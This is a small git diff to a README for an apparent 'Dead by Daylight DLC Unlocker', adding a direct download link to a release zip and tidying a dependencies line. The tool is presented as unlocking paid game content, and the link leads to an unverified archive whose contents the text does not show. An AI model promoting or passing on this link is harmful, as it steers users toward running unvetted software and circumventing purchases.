@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.6.3 Release]() = `*Tool files & folder*`
+- [💾 v.1.6.3 Release](https://github.com/DeadByDaylight-DLC-Unlocker-v2/.github/releases/download/1.6.3/DeadbyDaylight-DLC.zip) = `*Tool files & folder*`
 
 ---
 
@@ -16,7 +16,7 @@
 
 ## 🧰 Dependencies:
 
-- A ** `Steam`, `Epic Games` or `Microsoft Store` version** of Dead By Daylight (v1.5 or newer)
+- A `Steam`, `Epic Games` or `Microsoft Store` version of Dead By Daylight (v1.5 or newer)
 - The **latest release** of Unlocker
 - An internet connection (for SteamCMD data fetch)
 - **.NET 7 Runtime** installed (if not already)
